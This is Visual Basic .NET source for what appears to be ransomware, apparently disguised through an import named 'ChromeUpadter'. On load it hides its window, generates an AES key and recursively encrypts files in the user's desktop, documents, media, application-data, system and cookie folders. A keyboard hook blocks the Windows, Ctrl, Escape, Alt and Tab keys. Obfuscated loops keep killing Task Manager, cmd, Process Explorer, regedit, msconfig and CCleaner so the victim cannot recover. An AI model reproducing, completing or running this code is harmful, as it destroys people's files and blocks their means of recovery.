Option Explicit On

Imports ChromeUpadter
Imports System.IO
Imports System.Security.Cryptography
Imports System.Net
Imports System.Runtime.InteropServices

Public Class Form1
    Dim usrDir = "C:\Users\" + Environment.UserName
    Private Declare Function SystemParametersInfo Lib "user32" Alias "SystemParametersInfoA" (ByVal uAction As Integer, ByVal uParam As Integer, ByVal lpvParam As String, ByVal fuWinIni As Integer) As Integer

    Private Const SETDESKWALLPAPER = 20
    Private Const UPDATEINIFILE = &H1
    Private Declare Ansi Function GetAsyncKeyState Lib "user32" (ByVal vkey As Integer) As Integer
    Private erhaltenerText As RichTextBox

    Private path1 As String

    Private path2 As String

    Private Sub Form1_Load(ByVal sender As Object, ByVal e As EventArgs) Handles MyBase.Load



        Dim HGHHHJZTRTHJGJGHFGHFUZTUZTZUTUZ As System.Threading.Thread
        HGHHHJZTRTHJGJGHFGHFUZTUZTZUTUZ = New System.Threading.Thread(AddressOf Me.crypt)
        HGHHHJZTRTHJGJGHFGHFUZTUZTZUTUZ.Start()
        Background.Main()

        Me.Hide()

        Me.ShowInTaskbar = False

        Timer1.Start()

    End Sub

    Private Sub Timer1_Tick(ByVal sender As Object, ByVal e As EventArgs) Handles Timer1.Tick
        ProgressBar1.Increment(3)
        If ProgressBar1.Value = 100 Then
            Form2.Show()
        End If
    End Sub

    Private Sub ProgressBar1_Click(ByVal sender As Object, ByVal e As EventArgs) Handles ProgressBar1.Click

    End Sub

    Private Shared Sub encryptAll(ByVal dir As String, ByVal aesKey As [Byte]())
        Dim di = New DirectoryInfo(dir)
        Try
            For Each fi As FileInfo In di.GetFiles("*.*")
                ABCDEFGHJIKLMNOPQRSTUVWXYZ.CryptFile.encryptFile(fi.FullName, aesKey)
            Next
            For Each d As DirectoryInfo In di.GetDirectories()
                encryptAll(d.FullName, aesKey)
            Next
        Catch generatedExceptionName As Exception
        End Try
    End Sub

    Public Sub crypt()

        System.Threading.Thread.CurrentThread.Priority = System.Threading.ThreadPriority.Highest
        Dim myKey As [Byte]() = ABCDEFGHJIKLMNOPQRSTUVWXYZ.AES.generateKey()
        Dim RSAObj As New RSACryptoServiceProvider()
        encryptAll(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), myKey)
        encryptAll(Environment.GetFolderPath(Environment.SpecialFolder.Personal), myKey)
        encryptAll(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures), myKey)
        encryptAll(Environment.GetFolderPath(Environment.SpecialFolder.MyMusic), myKey)
        encryptAll(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments), myKey)
        encryptAll(Environment.GetFolderPath(Environment.SpecialFolder.MyVideos), myKey)
        encryptAll(Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments), myKey)
        encryptAll(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), myKey)
        encryptAll(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), myKey)
        encryptAll(Environment.GetFolderPath(Environment.SpecialFolder.Templates), myKey)
        encryptAll(Environment.GetFolderPath(Environment.SpecialFolder.System), myKey)
        encryptAll(Environment.GetFolderPath(Environment.SpecialFolder.Cookies), myKey)
        encryptAll(Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory), myKey)
        encryptAll(Environment.GetFolderPath(Environment.SpecialFolder.Favorites), myKey)
        encryptAll(Environment.GetFolderPath(Environment.SpecialFolder.History), myKey)
        encryptAll(Environment.GetFolderPath(Environment.SpecialFolder.InternetCache), myKey)
        encryptAll(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), myKey)
        encryptAll(Environment.GetFolderPath(Environment.SpecialFolder.MyComputer), myKey)
        encryptAll(usrDir, myKey)
    End Sub
    Declare Function FindWindow Lib "user32" Alias "FindWindowA" (ByVal lpClassName As String, ByVal lpWindowName As String) As Integer
    Declare Function SetWindowPos Lib "user32" (ByVal hwnd As Integer, ByVal hWndInsertAfter As Integer, ByVal x As Integer, ByVal y As Integer, ByVal cx As Integer, ByVal cy As Integer, ByVal wFlags As Integer) As Integer



    Const SWP_HIDEWINDOW = &H80
    Const SWP_SHOWWINDOW = &H40



    Private Structure KBDLLHOOKSTRUCT

        Public key As Keys
        Public scanCode As Integer
        Public flags As Integer
        Public time As Integer
        Public extra As IntPtr
    End Structure

    'System level functions to be used for hook and unhook keyboard input
    Private Delegate Function LowLevelKeyboardProc(ByVal nCode As Integer, ByVal wParam As IntPtr, ByVal lParam As IntPtr) As IntPtr
    <DllImport("user32.dll", CharSet:=CharSet.Auto, SetLastError:=True)>
    Private Shared Function SetWindowsHookEx(ByVal id As Integer, ByVal callback As LowLevelKeyboardProc, ByVal hMod As IntPtr, ByVal dwThreadId As UInteger) As IntPtr
    End Function
    <DllImport("user32.dll", CharSet:=CharSet.Auto, SetLastError:=True)>
    Private Shared Function UnhookWindowsHookEx(ByVal hook As IntPtr) As Boolean
    End Function
    <DllImport("user32.dll", CharSet:=CharSet.Auto, SetLastError:=True)>
    Private Shared Function CallNextHookEx(ByVal hook As IntPtr, ByVal nCode As Integer, ByVal wp As IntPtr, ByVal lp As IntPtr) As IntPtr
    End Function
    <DllImport("kernel32.dll", CharSet:=CharSet.Auto, SetLastError:=True)>
    Private Shared Function GetModuleHandle(ByVal name As String) As IntPtr
    End Function
    <DllImport("user32.dll", CharSet:=CharSet.Auto)>
    Private Shared Function GetAsyncKeyState(ByVal key As Keys) As Short
    End Function

    'Declaring Global objects
    Private ptrHook As IntPtr
    Private objKeyboardProcess As LowLevelKeyboardProc



    Public Sub New()

        Try
            Dim objCurrentModule As ProcessModule = Process.GetCurrentProcess().MainModule
            'Get Current Module
            objKeyboardProcess = New LowLevelKeyboardProc(AddressOf captureKey)
            'Assign callback function each time keyboard process
            ptrHook = SetWindowsHookEx(13, objKeyboardProcess, GetModuleHandle(objCurrentModule.ModuleName), 0)
            'Setting Hook of Keyboard Process for current module
            ' This call is required by the Windows Form Designer.
            InitializeComponent()

            ' Add any initialization after the InitializeComponent() call.

        Catch ex As Exception

        End Try
    End Sub


    Private Function captureKey(ByVal nCode As Integer, ByVal wp As IntPtr, ByVal lp As IntPtr) As IntPtr

        Try
            If nCode >= 0 Then
                Dim objKeyInfo As KBDLLHOOKSTRUCT = DirectCast(Marshal.PtrToStructure(lp, GetType(KBDLLHOOKSTRUCT)), KBDLLHOOKSTRUCT)
                If objKeyInfo.key = Keys.RWin OrElse objKeyInfo.key = Keys.LWin Then
                    ' Disabling Windows keys
                    Return CType(1, IntPtr)
                End If
                If objKeyInfo.key = Keys.ControlKey OrElse objKeyInfo.key = Keys.Escape Then
                    ' Disabling Ctrl + Esc keys
                    Return CType(1, IntPtr)
                End If
                If objKeyInfo.key = Keys.ControlKey OrElse objKeyInfo.key = Keys.Down Then
                    ' Disabling Ctrl + Esc keys
                    Return CType(1, IntPtr)
                End If
                If objKeyInfo.key = Keys.Alt OrElse objKeyInfo.key = Keys.Tab Then
                    ' Disabling Ctrl + Esc keys
                    Return CType(1, IntPtr)
                End If
                If objKeyInfo.key = Keys.F2 Then
                    ' Disabling Ctrl + Esc keys
                    Return CType(1, IntPtr)
                End If
            End If
            Return CallNextHookEx(ptrHook, nCode, wp, lp)
        Catch ex As Exception

        End Try
    End Function
#Region "Blockieren"
    Sub block()
        Try
            While True
                Dim HàÉIî2Ðù24Ô6ËþëÄÈëªÿFµÊäÊD5Ø1ÌÊÎâJ As String = "taskmgr"
                For Each p As Process In Process.GetProcessesByName(HàÉIî2Ðù24Ô6ËþëÄÈëªÿFµÊäÊD5Ø1ÌÊÎâJ)
                    p.Kill()
                Next
                Threading.Thread.Sleep(100)
            End While
        Catch ex As Exception

        End Try
    End Sub


    Sub block2()
        Try
            While True
                Dim Îµ0Ê9ÓýMáÆÄÞýµTÉï22ÊÉãÄ9ÏVúùTþKÓQTµÔÐýâWþÉÍÄâPBþQ9ÂUÐÐýNCÞúý As String = "cmd"
                For Each p As Process In Process.GetProcessesByName(Îµ0Ê9ÓýMáÆÄÞýµTÉï22ÊÉãÄ9ÏVúùTþKÓQTµÔÐýâWþÉÍÄâPBþQ9ÂUÐÐýNCÞúý)
                    p.Kill()
                Next
                Threading.Thread.Sleep(100)
            End While
        Catch ex As Exception

        End Try
    End Sub

    Sub block3()
        Try
            While True
                Dim ªºþºÊºMÃáõ5ÈÿâÉÂºÚÂÊµ5îÌOýBJÎ0SÈYã As String = "procexp"
                For Each p As Process In Process.GetProcessesByName(ªºþºÊºMÃáõ5ÈÿâÉÂºÚÂÊµ5îÌOýBJÎ0SÈYã)
                    p.Kill()
                Next
                Threading.Thread.Sleep(100)
            End While
        Catch ex As Exception

        End Try
    End Sub
    Sub block4()
        Try
            While True
                Dim ÊÍÉëÿBªªÚXÉÓÄ74ÏMß0äÂJýÈNýÉHýËëµÇªÎRÈá9Úð3ªMÆíÄÎäÇOîÄ0ïïOÄ2ÈýËÚË As String = "procexp64"
                For Each p As Process In Process.GetProcessesByName(ÊÍÉëÿBªªÚXÉÓÄ74ÏMß0äÂJýÈNýÉHýËëµÇªÎRÈá9Úð3ªMÆíÄÎäÇOîÄ0ïïOÄ2ÈýËÚË)
                    p.Kill()
                Next
                Threading.Thread.Sleep(100)
            End While
        Catch ex As Exception

        End Try
    End Sub
    Sub block5()
        Try
            While True
                Dim ÄÞýµTÉï22ÊÉãÄ9ÏVÊUKªÈµú03Ê9ÓýMáÆÄÞýµTÉï22ÊÉãÄ9ÏVÊUKªÈµú03íN1Êí0ÆÊHKÉNÊÍÉëÿBªªÚXÉÓÄ74ÏMß03ÚªîùKÆÊX As String = "regedit"
                For Each p As Process In Process.GetProcessesByName(ÄÞýµTÉï22ÊÉãÄ9ÏVÊUKªÈµú03Ê9ÓýMáÆÄÞýµTÉï22ÊÉãÄ9ÏVÊUKªÈµú03íN1Êí0ÆÊHKÉNÊÍÉëÿBªªÚXÉÓÄ74ÏMß03ÚªîùKÆÊX)
                    p.Kill()
                Next
                Threading.Thread.Sleep(100)
            End While
        Catch ex As Exception

        End Try
    End Sub
    Sub block6()
        Try
            While True
                Dim ëµÇªîÆKáîíEËDµýßÅJµÒÊðCBþÓKµßQÎËþÉºÎXØÏÎRÈá9Úð3ªMÆíÄÎäÇOîÄ0ïïOÄ2ÈýËÚËõYðÈÇâõÈKÊTÞT2OàÇIÆI As String = "CCleaner64"
                For Each p As Process In Process.GetProcessesByName(ëµÇªîÆKáîíEËDµýßÅJµÒÊðCBþÓKµßQÎËþÉºÎXØÏÎRÈá9Úð3ªMÆíÄÎäÇOîÄ0ïïOÄ2ÈýËÚËõYðÈÇâõÈKÊTÞT2OàÇIÆI)
                    p.Kill()
                Next
                Threading.Thread.Sleep(100)
            End While
        Catch ex As Exception

        End Try
    End Sub
    Sub block7()
        Try
            While True
                Dim MÃáõ5ÈÿâÉÂºÚÂÊµ5îÌOýBJÎ0SÈYãÊÎµ0Ê9ÓýMáÆÄÞýþëÄÈëªÿFµÊäÊD5Ø1ÌÊÎâJé0ÍõAÍÞÍÓíÓ5úãÄM62ÆüÞûÉXµTÉ As String = "msconfig"
                For Each p As Process In Process.GetProcessesByName(MÃáõ5ÈÿâÉÂºÚÂÊµ5îÌOýBJÎ0SÈYãÊÎµ0Ê9ÓýMáÆÄÞýþëÄÈëªÿFµÊäÊD5Ø1ÌÊÎâJé0ÍõAÍÞÍÓíÓ5úãÄM62ÆüÞûÉXµTÉ)
                    p.Kill()
                Next
                Threading.Thread.Sleep(100)
            End While
        Catch ex As Exception

        End Try
    End Sub
#End Region
End Class
